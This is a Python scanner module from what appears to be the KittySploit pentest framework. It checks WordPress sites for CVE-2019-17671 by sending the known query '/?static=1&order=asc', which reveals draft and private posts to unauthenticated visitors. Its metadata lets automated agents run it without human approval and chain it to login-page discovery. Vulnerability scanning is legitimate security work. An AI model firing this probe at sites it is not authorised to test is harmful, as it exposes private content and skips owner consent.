#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress before 5."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress <= 5.2.4 - Unauthenticated View Private/Draft Posts Detection',
        'description': 'WordPress before 5.2.4 contains an information disclosure caused by mishandling of the static query property, letting unauthenticated users view certain content, exploit requires no authentication.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'wp', 'wordpress', 'unauth', 'disclosure'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-523-security-and-maintenance-release.html',
            'https://core.trac.wordpress.org/changeset/46474',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-17671',
            'https://seclists.org/bugtraq/2020/Jan/8',
        ],
        'cve': 'CVE-2019-17671',
    }

    def run(self):
        r = self.http_request(method="GET", path='/?static=1&order=asc', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('type-page status-draft', 'type-post status-draft',)
        body_regexes = ('class="[^"]*entry-title[^"]*"[^>]*>[^<]{3,}', 'WordPress ([0-4]\\.|5\\.[0-2]\\.|5\\.2\\.[0-3])',)
        if (any(m in body for m in body_any)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="WordPress <= 5.2.4 - Unauthenticated View Private/Draft Posts detected",
                path='/?static=1&order=asc',
            )
            return True
        return False

